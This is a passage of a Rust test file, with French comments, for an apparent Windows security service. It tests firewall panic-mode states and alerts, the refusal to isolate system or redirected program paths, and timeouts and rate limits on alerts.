    assert!(e.contains(PS) && e.contains("état incertain"), "{e}");
    assert!(!efface.get(), "drapeau gardé tant qu'une règle reste");
    let pf = PareFeuSimule::default();
    pf.regles.borrow_mut().extend([(PS.to_string(), true), (PE.to_string(), true)]);
    assert!(desactiver_panique(&pf, &effacer).is_ok());
    assert!(efface.get() && pf.regles.borrow().is_empty());
    assert!(desactiver_panique(&PareFeuSimule::default(), &|| Err("x".into())).is_err(), "drapeau non effacé : erreur");
}

#[test]
fn panique_etat_effectif_sur_les_regles() {
    use crate::reponse::{etat_panique_de as e, EtatPanique::*};
    let pf = PareFeuSimule::default();
    assert_eq!(e(&pf, false), Inactive);
    assert_eq!(e(&pf, true), Incertaine, "drapeau sans règle : pas « actif »");
    pf.regles.borrow_mut().push((PS.into(), true));
    assert_eq!(e(&pf, true), Incertaine, "une seule règle");
    assert_eq!(e(&pf, false), Incertaine, "règle sans drapeau");
    pf.regles.borrow_mut().push((PE.into(), false));
    assert_eq!(e(&pf, true), Incertaine, "règle désactivée");
    pf.regles.borrow_mut()[1].1 = true;
    assert_eq!(e(&pf, true), Active);
    assert_eq!((Active.texte(), Inactive.texte(), Incertaine.texte()), ("active", "inactive", "incertaine"));
}

#[test]
fn panique_alerte_rep_003() {
    use crate::moniteur::alerte_panique as a;
    use crate::reponse::EtatPanique::*;
    let x = a(true, "refusé", Inactive);
    assert_eq!((x.regle.as_str(), x.niveau.as_str()), ("REP-003", "Critique"));
    assert!(x.raisons.contains("NON activé") && x.raisons.contains("refusé") && x.raisons.contains("état d'avant"), "{}", x.raisons);
    let x = a(false, "règle restée", Incertaine);
    assert!(x.raisons.contains("NON désactivé") && x.raisons.contains("incertaine") && x.raisons.contains("Rétablir Internet"), "{}", x.raisons);
    // Préparation : seulement pour l'activation
    let c = |v: &str| crate::commun::Commande { action: Some("panique".into()), valeur: Some(v.into()), ..Default::default() };
    assert!(crate::moniteur::preparer(&c("off")).epargnees.is_none());
    assert!(crate::moniteur::preparer(&crate::commun::Commande { action: Some("tuer".into()), ..Default::default() }).epargnees.is_none());
}

/// Relecture de #117, P1 : REP-003 quand l'état devient incertain hors d'une commande
#[test]
fn panique_devenue_incertaine_alerte() {
    use crate::moniteur::{alerte_panique_incertaine, panique_devenue_incertaine as d};
    use crate::reponse::EtatPanique::*;
    assert!(d(Active, Incertaine) && d(Inactive, Incertaine));
    assert!(!d(Incertaine, Incertaine), "une seule alerte");
    assert!(!d(Active, Active) && !d(Active, Inactive) && !d(Incertaine, Inactive));
    let a = alerte_panique_incertaine();
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("REP-003", "Critique"));
    assert!(a.raisons.contains("Rétablir Internet") && !a.raisons.contains("  "), "{}", a.raisons);
}

/// PR 6.6 : le refus du dossier Windows porte sur le chemin final
#[test]
fn isolation_chemin_final_dans_windows_refuse() {
    use crate::reponse::{chemin_dos, isolation_permise as p};
    let w = r"C:\WINDOWS";
    assert!(p(r"\\?\C:\Windows\System32\cmd.exe", w).is_err(), "System32");
    assert!(p(r"\\?\C:\WINDOWS", w).is_err(), "le dossier lui-même");
    assert!(p(r"\\?\c:\windows\explorer.exe", w).is_err(), "casse");
    assert_eq!(p(r"\\?\C:\WindowsApps\x.exe", w).unwrap(), r"C:\WindowsApps\x.exe", "préfixe du nom seulement : pas sous Windows");
    assert_eq!(p(r"\\?\C:\Users\a\outil.exe", r"C:\Windows\").unwrap(), r"C:\Users\a\outil.exe");
    assert!(p(r"\\?\UNC\serveur\partage\x.exe", w).is_err(), "réseau");
    assert!(p(r"\\?\Volume{0123}\x.exe", w).is_err(), "volume sans lettre");
    assert!(p(r"\\?\C:\Users\a\x.exe", "").is_err(), "dossier Windows inconnu : refus");
    assert_eq!(chemin_dos(r"D:\x.exe").as_deref(), Some(r"D:\x.exe"));
    assert!(chemin_dos("C:").is_none() && chemin_dos("").is_none());
    // Sur disque : une jonction vers System32 plus haut dans le chemin est résolue, puis refusée ; un programme ordinaire passe
    let d = std::env::temp_dir().join(format!("d4t-iso-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    jonction(&d.join("j"), std::path::Path::new(&crate::natif::dossier_systeme()));
    let e = crate::reponse::chemin_final_a_isoler(&d.join("j").join("cmd.exe").to_string_lossy()).unwrap_err();
    // Depuis la relecture de #119 (R1), refusé avant même d'ouvrir : un dossier du chemin est un lien
    assert!(e.contains("lien") && e.contains("chemin réel"), "{e}");
    // La jonction elle-même, un dossier : jamais isolable (ouverte comme fichier, refusée)
    let e = crate::reponse::chemin_final_a_isoler(&d.join("j").to_string_lossy()).unwrap_err();
    assert!(e.starts_with("Refusé"), "{e}");
    std::fs::write(d.join("outil.exe"), b"x").unwrap();
    let ok = crate::reponse::chemin_final_a_isoler(&d.join("outil.exe").to_string_lossy()).unwrap();
    assert!(crate::natif::meme_chemin(&ok, &crate::natif::forme_longue(&d.join("outil.exe")).to_string_lossy()), "{ok}");
    assert!(!ok.starts_with(r"\\?\"), "règle posée sans préfixe");
    assert!(crate::reponse::chemin_final_a_isoler(&d.join("absent.exe").to_string_lossy()).unwrap_err().contains("introuvable"));
    assert!(crate::reponse::chemin_final_a_isoler(" ").is_err());
    let _ = std::fs::remove_dir(d.join("j"));
    let _ = std::fs::remove_dir_all(&d);
}

/// Relecture de #118, R1 : refus sur le texte avant toute ouverture ; audit de #118, S118-01 : isolation revérifiée
#[test]
fn isolation_reverifiee_et_refus_avant_ouverture() {
    use crate::reponse::{chemin_final_a_isoler as c, decision_isolation as d, EtatIsolation::*};
    for x in [r"\\serveur\partage\x.exe", r"\\.\pipe\x", r"\\?\UNC\serveur\p\x.exe", r"\\?\GLOBALROOT\x", "relatif.exe", "C:/x.exe"] {
        assert!(c(x).unwrap_err().contains("lecteur local"), "{x}");
    }
    let w = r"C:\Windows";
    assert_eq!(d(r"C:\Users\a\x.exe", &Ok(Some(r"\\?\C:\Users\a\X.exe".into())), w), Valable);
    assert_eq!(d(r"C:\Users\a\x.exe", &Ok(None), w), Absent, "absent : la règle reste");
    assert_eq!(d(r"C:\Users\a\x.exe", &Err("verrou".into()), w), Illisible);
    assert_eq!(d(r"C:\Users\a\d\svchost.exe", &Ok(Some(r"\\?\C:\Windows\System32\svchost.exe".into())), w), Detournee(r"\\?\C:\Windows\System32\svchost.exe".into()), "jonction vers System32");
    assert_eq!(d(r"C:\Users\a\d\x.exe", &Ok(Some(r"\\?\C:\Users\b\x.exe".into())), w), Detournee(r"C:\Users\b\x.exe".into()), "autre programme");
    assert!(matches!(d(r"C:\Users\a\x.exe", &Ok(Some("(lien)".into())), w), Detournee(_)), "lien en dernier élément");
    // Sur disque : isolé, puis le dossier remplacé par une jonction
    let r = std::env::temp_dir().join(format!("d4t-isov-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&r);
    std::fs::create_dir_all(r.join("d")).unwrap();
    // Nom absent de Windows : un nom de Windows est refusé dès l'isolation (audit de #119, S119-03)
    std::fs::write(r.join("d").join("outil-d4t.exe"), b"x").unwrap();
    let cible = c(&r.join("d").join("outil-d4t.exe").to_string_lossy()).unwrap();
    assert_eq!(crate::reponse::verifier_isolation(&cible), Valable);
    std::fs::remove_dir_all(r.join("d")).unwrap();
    // Dossier parent absent : illisible, la règle reste (relecture de #119, R3)
    assert_eq!(crate::reponse::verifier_isolation(&cible), Illisible);
    jonction(&r.join("d"), std::path::Path::new(&crate::natif::dossier_systeme()));
    // Le dossier devenu jonction est vu sans être suivi (audit de #118, S118-03)
    assert!(matches!(crate::reponse::verifier_isolation(&cible), Detournee(v) if v.ends_with("(lien)")));
    let _ = std::fs::remove_dir(r.join("d"));
    let _ = std::fs::remove_dir_all(&r);
    assert!(matches!(crate::reponse::verifier_isolation(r"\\serveur\p\x.exe"), Detournee(_)), "jamais ouvert");
    let a = crate::moniteur::alerte_isolation_detournee(r"C:\a\x.exe", r"C:\Windows\System32\x.exe");
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("REP-004", "Critique"));
    assert!(a.raisons.contains("System32") && a.raisons.contains("jamais levées automatiquement") && !a.raisons.contains("  "), "{}", a.raisons);
}

/// Relecture de #118, R2 : une lecture recouverte par une commande du mode panique n'est pas publiée
#[test]
fn panique_lecture_recouverte_non_publiee() {
    use crate::reponse::lecture_publiable as p;
    assert!(p(4, 4, false));
    assert!(!p(4, 4, true), "commande en cours");
    assert!(!p(4, 5, false), "commande commencée pendant la lecture");
    assert!(!p(4, 6, false), "commande commencée et finie pendant la lecture");
}

/// Démarrage du service : état provisoire tiré du drapeau seul
#[test]
fn panique_etat_provisoire_au_demarrage() {
    use crate::reponse::{etat_provisoire as e, EtatPanique::*};
    assert_eq!(e(true), Incertaine, "drapeau sans lecture des règles : jamais « active »");
    assert_eq!(e(false), Inactive);
}

/// Audit de #118 : nom d'un binaire critique hors de Windows refusé ; dossier parent devenu lien, détourné sans l'ouvrir
#[test]
fn isolation_nom_critique_et_parent_lien() {
    use crate::reponse::{isolation_permise as p, verifier_isolation, EtatIsolation::*};
    let w = r"C:\Windows";
    for n in ["svchost.exe", "LSASS.EXE", "explorer.exe", "csrss.exe", "winlogon.exe"] {
        let e = p(&format!(r"\\?\C:\Users\a\d\{n}"), w).unwrap_err();
        assert!(e.contains("programme critique") && e.contains("quarantaine"), "{n} : {e}");
    }
    assert!(p(r"\\?\C:\Users\a\d\svchost2.exe", w).is_ok(), "nom voisin accepté");
    assert!(p(r"\\?\C:\Users\a\svchost.exe\outil.exe", w).is_ok(), "seul le nom du fichier compte");
    let r = std::env::temp_dir().join(format!("d4t-isop-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&r);
    std::fs::create_dir_all(r.join("d")).unwrap();
    std::fs::write(r.join("d").join("x.exe"), b"x").unwrap();
    let cible = crate::reponse::chemin_final_a_isoler(&r.join("d").join("x.exe").to_string_lossy()).unwrap();
    assert_eq!(verifier_isolation(&cible), Valable);
    std::fs::remove_dir_all(r.join("d")).unwrap();
    // Le dossier remplacé par une jonction vers un dossier qui contient un x.exe : détourné sur le lien, sans le suivre
    std::fs::create_dir_all(r.join("ailleurs")).unwrap();
    std::fs::write(r.join("ailleurs").join("x.exe"), b"y").unwrap();
    jonction(&r.join("d"), &r.join("ailleurs"));
    match verifier_isolation(&cible) {
        Detournee(v) => assert!(crate::natif::meme_chemin(v.trim_end_matches(" (lien)"), &crate::natif::forme_longue(&r.join("d")).to_string_lossy()), "{v}"),
        e => panic!("{e:?}"),
    }
    let _ = std::fs::remove_dir(r.join("d"));
    // Dossier parent absent : illisible, la règle reste (relecture de #119, R3)
    assert_eq!(verifier_isolation(&cible), Illisible);
    // Un dossier plus haut devenu lien : vu aussi, c'est lui qui est nommé (le plus proche de la racine)
    let g = r.join("g");
    std::fs::create_dir_all(g.join("a").join("b")).unwrap();
    std::fs::write(g.join("a").join("b").join("y.exe"), b"x").unwrap();
    let cible2 = crate::reponse::chemin_final_a_isoler(&g.join("a").join("b").join("y.exe").to_string_lossy()).unwrap();
    std::fs::rename(&g, r.join("g-vrai")).unwrap();
    jonction(&g, &r.join("g-vrai"));
    match verifier_isolation(&cible2) {
        Detournee(v) => assert!(crate::natif::meme_chemin(v.trim_end_matches(" (lien)"), &crate::natif::forme_longue(&g).to_string_lossy()), "{v}"),
        e => panic!("{e:?}"),
    }
    let _ = std::fs::remove_dir(&g);
    let _ = std::fs::remove_dir_all(&r);
}

/// Relecture de #119 : B1 (premier relevé), R2 (seuls les liens comptent)
#[test]
fn panique_premier_releve_et_etiquettes_de_lien() {
    use crate::moniteur::{etat_avant_releve as a, panique_devenue_incertaine as d};
    use crate::reponse::{etiquette_lien as l, EtatPanique::*};
    assert!(d(a(true, Incertaine), Incertaine), "incertain hérité du démarrage : alerte au premier relevé");
    assert!(!d(a(false, Incertaine), Incertaine), "relevés suivants : une seule alerte");
    assert!(!d(a(true, Incertaine), Active) && !d(a(true, Inactive), Inactive));
    assert!(l(0xA000_0003) && l(0xA000_000C), "jonction, lien symbolique");
    assert!(l(0xA000_0027), "autre substitut de nom (bit 29)");
    for e in [0x9000_001Au32, 0x8000_0013, 0x8000_0017, 0] {
        assert!(!l(e), "{e:#x} : OneDrive, déduplication… ne sont pas des liens");
    }
    // Sur disque : la commande refuse un chemin dont un dossier est une jonction, sans la traverser
    let r = std::env::temp_dir().join(format!("d4t-iso119-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&r);
    std::fs::create_dir_all(r.join("vrai")).unwrap();
    std::fs::write(r.join("vrai").join("x.exe"), b"x").unwrap();
    jonction(&r.join("j"), &r.join("vrai"));
    let e = crate::reponse::chemin_final_a_isoler(&r.join("j").join("x.exe").to_string_lossy()).unwrap_err();
    assert!(e.contains("lien") && e.contains("chemin réel"), "{e}");
    let _ = std::fs::remove_dir(r.join("j"));
    let _ = std::fs::remove_dir_all(&r);
}

/// Audit de #119 : S119-01 (une seule descente par handles, aucun lien traversé) et S119-03 (noms de programmes de Windows)
#[test]
fn isolation_descente_par_handles_et_noms_de_windows() {
    use crate::natif::{ouvrir_sans_traverser_lien as o, ErreurOuverture as E};
    // Forme longue dès la racine : en production, le chemin passé à la descente est déjà un chemin final
    // (`chemin_final_a_isoler`), donc en noms longs. Sur un runner dont %TEMP% est en 8.3 (`C:\Users\RUNNER~1\…`),
    // un `temp_dir()` brut rendrait la racine courte et le détour `Detourne(p)` (qui reprend le chemin fourni)
    // ne correspondrait plus à `forme_longue(…)` : on développe donc la racine une fois pour toutes.
    let r = crate::natif::forme_longue(&std::env::temp_dir()).join(format!("d4t-iso613-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&r);
    std::fs::create_dir_all(r.join("a").join("b")).unwrap();
    std::fs::write(r.join("a").join("b").join("x.exe"), b"x").unwrap();
    let f = o(&r.join("a").join("b").join("x.exe"), 0x80).unwrap();
    assert!(crate::natif::meme_chemin(&crate::natif::chemin_final(&f).unwrap(), &crate::natif::forme_longue(&r.join("a").join("b").join("x.exe")).to_string_lossy()));
    drop(f);
    // Chemin relatif et « .. » : rendus absolus avant la descente
    assert!(o(&r.join("a").join("..").join("a").join("b").join("x.exe"), 0x80).is_ok());
    assert!(matches!(o(&r.join("a").join("b").join("absent.exe"), 0x80), Err(E::Absent)), "fichier seul absent");
    assert!(matches!(o(&r.join("absent").join("x.exe"), 0x80), Err(E::Autre(m)) if m.starts_with("dossier absent")), "dossier absent : pas « absent »");
    assert!(matches!(o(&r.join("a").join("b"), 0x80), Err(E::Autre(m)) if m.starts_with("dossier :")), "un dossier n'est pas un programme");
    // Jonction plus haut : nommée, jamais traversée ; jonction en dernier élément : refusée
    jonction(&r.join("j"), &r.join("a"));
    match o(&r.join("j").join("b").join("x.exe"), 0x80) {
        Err(E::Detourne(p)) => assert!(crate::natif::meme_chemin(&p, &crate::natif::forme_longue(&r.join("j")).to_string_lossy()), "{p}"),
        e => panic!("{:?}", e.map(|_| ())),
    }
    jonction(&r.join("a").join("b").join("y.exe"), &r.join("a"));
    assert!(matches!(o(&r.join("a").join("b").join("y.exe"), 0x80), Err(E::Lien)), "jonction en dernier élément : lue, pas suivie");
    for x in [r"\\serveur\p\x.exe", r"\\.\pipe\x", r"\\?\UNC\serveur\p\x.exe"] {
        assert!(matches!(o(std::path::Path::new(x), 0x80), Err(E::Autre(m)) if m == "pas un lecteur local à lettre"), "{x} : jamais ouvert");
    }
    let _ = std::fs::remove_dir(r.join("a").join("b").join("y.exe"));
    let _ = std::fs::remove_dir(r.join("j"));
    let _ = std::fs::remove_dir_all(&r);
    // Relecture de #126, R2 : préfixe `\\?\` d'un chemin local accepté ; D1 : la revérification ne relit pas le chemin entier
    std::fs::create_dir_all(r.join("p")).unwrap();
    std::fs::write(r.join("p").join("x.exe"), b"x").unwrap();
    assert!(o(std::path::Path::new(&format!(r"\\?\{}", r.join("p").join("x.exe").display())), 0x80).is_ok(), "préfixe d'un chemin local");
    let _ = std::fs::remove_dir_all(&r);
    let src = include_str!("reponse.rs").replace("\r\n", "\n");
    let corps = &src[src.find("pub fn verifier_isolation").unwrap()..];
    let corps = &corps[..corps.find("\n}\n").unwrap()];
    assert!(!corps.contains("forme_longue(") && !corps.contains("ouvrir_sans_lien(") && corps.contains("ouvrir_sans_traverser_lien("), "D1");
    // S126-02 : seule une étiquette qui redirige est un lien, en dernier élément aussi
    use crate::natif::{element_descente as el, ElementDescente::*};
    assert_eq!(el(0x400, 0xA000_0003, true), Lien, "jonction");
    assert_eq!(el(0x400, 0xA000_000C, false), Lien, "lien symbolique");
    assert_eq!(el(0x400 | 0x20, 0x9000_601A, true), Suivre, "fichier OneDrive à la demande");
    assert_eq!(el(0x400 | 0x10, 0x9000_601A, false), Suivre, "dossier OneDrive");
    assert_eq!(el(0x400, 0x8000_0013, true), Suivre, "déduplication");
    assert_eq!(el(0x10, 0, true), Dossier);
    assert_eq!(el(0x10, 0, false), Suivre);
    assert_eq!(el(0, 0xA000_0003, true), Suivre, "étiquette sans l'attribut : ignorée");
    assert_eq!(el(0x400, 0x8000_001B, true), Lien, "alias d'exécution d'application en dernier élément");
    assert_eq!(el(0, 0x8000_001B, true), Suivre);
    // S119-03 : un nom présent dans Windows, System32 ou SysWOW64 est refusé, où que soit le programme
    use crate::reponse::nom_programme_windows as n;
    let w = crate::natif::dossier_windows();
    for nom in ["dllhost.exe", "RuntimeBroker.exe", "notepad.exe", "cmd.exe", "DLLHOST.EXE"] {
        assert!(n(nom, &w, |p| p.is_file()), "{nom}");
    }
    assert!(!n("outil-maison-d4t.exe", &w, |p| p.is_file()));
    assert!(!n("", &w, |_| true) && !n("x.exe", "", |_| true) && !n(r"..\x.exe", &w, |_| true), "entrées vides ou composées");
    let vus = std::cell::RefCell::new(Vec::new());
    n("x.exe", r"C:\Windows\", |p| { vus.borrow_mut().push(p.to_string_lossy().to_string()); false });
    assert_eq!(*vus.borrow(), [r"C:\Windows\x.exe", r"C:\Windows\System32\x.exe", r"C:\Windows\SysWOW64\x.exe"]);
    let d = std::env::temp_dir().join(format!("d4t-iso613n-{}", std::process::id()));
    std::fs::create_dir_all(&d).unwrap();
    std::fs::write(d.join("dllhost.exe"), b"x").unwrap();
    let e = crate::reponse::chemin_final_a_isoler(&d.join("dllhost.exe").to_string_lossy()).unwrap_err();
    assert!(e.contains("livré avec Windows") && e.contains("quarantaine"), "{e}");
    let _ = std::fs::remove_dir_all(&d);
}

/// Audit de #119 : isolation illisible plusieurs relevés de suite, dite une fois
#[test]
fn isolation_non_verifiable_alerte_une_fois() {
    use crate::moniteur::{alerte_isolation_non_verifiable as a, compter_illisible as c, RELEVES_ILLISIBLES as n};
    assert_eq!(c(0, true), (1, false));
    assert_eq!(c(n - 1, true), (n, true), "au 3e relevé illisible");
    assert_eq!(c(n, true), (n + 1, false), "une seule fois");
    assert_eq!(c(7, false), (0, false), "relu : remis à zéro");
    assert_eq!(c(u32::MAX, true).0, u32::MAX);
    let x = a(r"C:\a\x.exe");
    assert_eq!((x.regle.as_str(), x.niveau.as_str()), ("REP-004", "Alerte"));
    assert!(x.raisons.contains("non vérifiable") && x.raisons.contains("3 relevés de 5 min") && x.raisons.contains("gardées") && !x.raisons.contains("  "), "{}", x.raisons);
}

/// Audit de #116, S116-01 : au plus une relance par sorte et par heure, les retenues partent avec la suivante
#[test]
fn relances_plafonnees_par_sorte_et_par_heure() {
    use crate::politique::{intervalle_relances, Historique, Plafond, Sorte::*};
    let mut h = Historique::default();
    for i in 0..3u32 {
        h.ouvrir(SuspensionAuto, &format!("p{i}.exe"), Some(i + 1), Some(1), S0 + i as u64 * 60);
    }
    h.ouvrir(Panique, "poste", None, None, S0);
    let mut p = Plafond::default();
    // Échéances étalées d'une minute : la première part, les deux suivantes attendent l'heure
    let t1 = S0 + 7_200;
    let r = h.relances(t1);
    let e = p.plafonner(r, &h.actions.clone(), t1);
    assert_eq!(e.iter().filter(|(a, _)| a.sorte == SuspensionAuto).count(), 1);
    let e = { let r = h.relances(t1 + 60); p.plafonner(r, &h.actions.clone(), t1 + 60) };
    assert!(e.iter().all(|(a, _)| a.sorte != SuspensionAuto), "retenue pendant l'heure");
    let e = { let r = h.relances(t1 + 120); p.plafonner(r, &h.actions.clone(), t1 + 120) };
    assert!(e.is_empty());
    // Une heure après la première : les deux retenues partent ensemble
    let e = { let r = h.relances(t1 + 3_600); p.plafonner(r, &h.actions.clone(), t1 + 3_600) };
    assert_eq!(e.iter().filter(|(a, _)| a.sorte == SuspensionAuto).count(), 2, "retenues comptées, pas perdues");
    // Une autre sorte a sa propre fenêtre ; la panique (4 h) part à son heure
    let tp = S0 + 4 * 3_600;
    let e = { let r = h.relances(tp); p.plafonner(r, &h.actions.clone(), tp) };
    assert!(e.iter().any(|(a, _)| a.sorte == Panique));
    assert_eq!(intervalle_relances(Quarantaine), 86_400);
    assert_eq!(intervalle_relances(BlocageManuel), 86_400);
    assert_eq!(intervalle_relances(SuspensionAuto), 3_600);
    // Une même action retenue deux fois n'est comptée qu'une fois
    let mut p = Plafond::default();
    let mut h = Historique::default();
    h.ouvrir(Isolation, "a", None, None, S0);
    h.ouvrir(Isolation, "b", None, None, S0);
    let premiere = h.relances(S0 + 604_800);
    assert_eq!(p.plafonner(premiere, &h.actions.clone(), S0 + 604_800).len(), 2, "même tour : groupées");
    let mut x = h.actions[0].clone();
    x.relances = 9;
    let d = vec![(x.clone(), crate::politique::Effet::Relancer { niveau: "Alerte" }), (x, crate::politique::Effet::Relancer { niveau: "Alerte" })];
    assert!(p.plafonner(d, &h.actions.clone(), S0 + 604_860).is_empty());
    let e = p.plafonner(Vec::new(), &h.actions.clone(), S0 + 604_800 + 3_600);
    assert_eq!(e.len(), 1, "dédoublonnée");
    assert_eq!(e[0].0.relances, h.actions[0].relances, "version à jour du registre, pas la copie retenue");
    // D1 (relecture de #122) : retenue, puis close, puis fenêtre suivante : rien n'est émis
    let mut p = Plafond::default();
    let mut h = Historique::default();
    for i in 0..2u32 {
        h.ouvrir(SuspensionAuto, &format!("q{i}.exe"), Some(i + 1), Some(1), S0 + i as u64 * 60);
    }
    let r = h.relances(S0 + 7_200);
    assert_eq!(p.plafonner(r, &h.actions.clone(), S0 + 7_200).len(), 1);
    let r = h.relances(S0 + 7_260);
    assert!(p.plafonner(r, &h.actions.clone(), S0 + 7_260).is_empty(), "retenue");
    h.clore(&[SuspensionAuto], None, Some((2, 1)), crate::politique::EtatAction::Levee);
    let actives: Vec<_> = h.actions.iter().filter(|a| a.etat == crate::politique::EtatAction::Active).cloned().collect();
    assert!(p.plafonner(Vec::new(), &actives, S0 + 7_200 + 3_600).is_empty(), "action levée pendant l'attente : oubliée");
}

/// Audit de #117, S117-02 : lecture du pare-feu avec échéance, un seul fil en attente
#[test]
fn panique_lecture_avec_echeance() {
    let p = include_str!("politique.rs").replace("\r\n", "\n");
    assert!(p.contains("let a_emettre = PLAFOND.lock().unwrap_or_else(|p| p.into_inner()).plafonner(dues, &actives, t);\n        let mut alertes = regrouper_relances(&a_emettre, t);"), "S116-01 : plafond branché");
    assert!(p.contains("alertes.extend(plein.map(|texte| alerte_garde(&texte)));"), "S116-02 : registre plein dit");
    assert!(p.contains("let actives: Vec<ActionEnCours> = e.h.actions.iter().filter(|a| a.etat == EtatAction::Active).cloned().collect();"), "D1 : registre à jour");
    let r = include_str!("reponse.rs").replace("\r\n", "\n");
    assert!(r.contains("let lu = avec_echeance(&LECTURE_PANIQUE, std::time::Duration::from_secs(DELAI_LECTURE_PANIQUE), move || {"), "S117-02 : lecture à échéance");
    use crate::reponse::avec_echeance as e;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::time::Duration;
    static OCCUPE: AtomicBool = AtomicBool::new(false);
    assert_eq!(e(&OCCUPE, Duration::from_secs(5), || 7), Some(7));
    assert!(!OCCUPE.load(Ordering::SeqCst), "relâché après une lecture");
    let debut = std::time::Instant::now();
    assert_eq!(e(&OCCUPE, Duration::from_millis(100), || { std::thread::sleep(Duration::from_millis(3_000)); 1 }), None, "échéance");
    assert!(debut.elapsed() < Duration::from_millis(2_000), "l'appelant n'attend pas la fin");
    assert_eq!(e(&OCCUPE, Duration::from_secs(1), || 2), None, "lecture figée en cours : aucun nouveau fil");
    std::thread::sleep(Duration::from_millis(4_000));
    assert_eq!(e(&OCCUPE, Duration::from_secs(5), || 3), Some(3), "relâché à la fin de la lecture figée");
}

/// Audit de #122, S122-02 et S122-03 : pare-feu muet, une ligne par panne, rien conclu
#[test]
fn panique_pare_feu_muet() {
    use crate::reponse::transition_pare_feu as t;
    assert!(t(false, true).is_some_and(|l| l.contains("ne répond pas")));
    assert!(t(true, false).is_some_and(|l| l.contains("répond de nouveau")));
    assert_eq!(t(true, true), None, "une ligne par panne");
    assert_eq!(t(false, false), None);
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    assert!(m.contains("let lu = crate::reponse::rafraichir_etat_panique();") && m.contains("if let Some(apres) = lu {"), "S122-03 : seule une lecture réelle conclut");
    let bloc = &m[m.find("if let Some(apres) = lu {").unwrap()..];
    let fin = bloc.find("premier_releve = false;").unwrap();
    assert!(fin < bloc.find("let (non_suivies, non_clos)").unwrap(), "premier relevé quitté dans le bloc d'une lecture réelle");
    assert!(m.contains("if reponse::rafraichir_etat_panique() != Some(reponse::EtatPanique::Inactive) {"), "--nettoyer : muet, retrait tenté");
}

/// Audit de #122 : pare-feu muet dit après 5 min ; retrait du mode panique à échéance pendant la désinstallation
#[test]
fn pare_feu_muet_alerte_et_nettoyage_a_echeance() {
    use crate::moniteur::{alerte_pare_feu_muet as a, compter_suite as c, RELEVES_PARE_FEU_MUET as n};
    let mut k = 0;
    let mut alertes = 0;
    for _ in 0..25 {
        let (x, dire) = c(k, true, n);
        k = x;
        alertes += dire as u32;
    }
    assert_eq!(alertes, 1, "une fois par panne");
    assert_eq!(c(k, false, n), (0, false), "réponse : remis à zéro");
    assert_eq!(c(n - 1, true, n), (n, true));
    let x = a();
    assert_eq!((x.regle.as_str(), x.niveau.as_str()), ("REP-003", "Alerte"));
    assert!(x.raisons.contains("5 min") && x.raisons.contains("MpsSvc") && !x.raisons.contains("  "), "{}", x.raisons);
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    assert!(m.contains("let (n, alerter) = compter_suite(pare_feu_muet, lu.is_none(), RELEVES_PARE_FEU_MUET);\n                        pare_feu_muet = n;\n                        if alerter {\n                            m.lock().unwrap().ajouter_alerte_brute(alerte_pare_feu_muet(), None);"), "branché : compté, puis alerté");
    assert!(m.contains("match reponse::avec_echeance(&NETTOYAGE_PANIQUE, Duration::from_secs(30), move || execution::panique(&a, false, &[])) {"), "D6-7 : ce retrait ne bloque plus la désinstallation");
    assert!(m.contains("Some(Ok(_)) => println!(\"Mode panique désactivé.\"),"), "relecture de #123, R1 : succès seulement");
    // Relecture de #123, D1 : tous les appels au pare-feu de --nettoyer sont à échéance
    let net = &m[m.find("pub fn nettoyer() {").unwrap()..];
    let net = &net[..net.find("\n}\n").unwrap()];
    assert!(net.contains("match reponse::avec_echeance(&NETTOYAGE_REGLES, Duration::from_secs(60), move || {"), "règles à échéance");
    for appel in ["blocage::supprimer_regle(", "blocage::supprimer_groupe_detail(", "execution::panique("] {
        let i = net.find(appel).unwrap_or_else(|| panic!("{appel}"));
        assert!(net[..i].rfind("avec_echeance(").is_some(), "{appel} sous une échéance");
    }
    assert_eq!(net.matches("avec_echeance(").count(), 2);
    assert!(net.contains("compte_rendu_nettoyage(&texte);"), "audit de #124, S124-02 : compte rendu lisible");
    assert!(include_str!("blocage.rs").contains(".current_dir(crate::natif::dossier_systeme())"), "S124-01 : dossier courant");
    // PR 6.12 : les PowerShell de règles du service sont suivis et attendus à l'arrêt
    assert!(include_str!("api.rs").contains("crate::blocage::powershell_regles(\"api\", &script);"), "API suivie");
    assert!(include_str!("capture.rs").contains("crate::blocage::powershell_regles(\"capture\", &script);"), "capture suivie");
    let principal = include_str!("main.rs").replace("\r\n", "\n");
    let (attente, arrete) = (principal.find("crate::blocage::REGLES_SERVICE.arreter(Duration::from_secs(15))").unwrap(), principal.find("statut(ServiceState::Stopped").unwrap());
    assert!(attente < arrete, "attendus avant de se dire arrêté");
    assert!(principal.contains("let n = crate::blocage::terminer_powershell_regles();") && principal.contains("natif::compte_rendu_systeme(\"deR4Tizer-arret\", &texte);"), "R1 : dépassement, arrêtés et dit");
    assert!(principal.contains("wait_hint: Duration::from_secs(30), ..statut(ServiceState::StopPending"), "R2 : délai annoncé");
    let b = include_str!("blocage.rs").replace("\r\n", "\n");
    assert!(b.contains("PIDS_REGLES.lock().unwrap_or_else(|p| p.into_inner()).push(pid);"), "R1 : seuls les PowerShell de règles, par PID");
    // S125-02 : le PID sort du suivi avant que le handle soit lâché, et l'arrêt tient le verrou jusqu'au bout
    let retrait = b.find(".retain(|p| *p != pid);").unwrap();
    assert!(retrait < b.find("drop(enfant);").unwrap() && !b.contains("wait_with_output"), "S125-02 : handle tenu jusqu'au retrait");
    let arret = &b[b.find("pub fn terminer_powershell_regles").unwrap()..];
    let arret = &arret[..arret.find("\n}\n").unwrap()];
    assert!(arret.contains("let pids = PIDS_REGLES.lock()") && !arret.contains(".clone()"), "S125-02 : verrou tenu pendant l'arrêt");
    assert!(principal.contains("natif::compte_rendu_systeme(\"deR4Tizer-desinstallation\", &texte);"), "R2 : --supprimer-donnees aussi");
}

/// Relecture de #125, R1 : un PowerShell de règles en cours est arrêté par son PID, et lui seul est compté
#[test]
fn powershell_regles_arretes_par_pid() {
    use std::time::{Duration, Instant};
    let debut = Instant::now();
    let fil = std::thread::spawn(|| crate::blocage::powershell_regles("essai", "Start-Sleep -Seconds 60"));
    let mut n = 0;
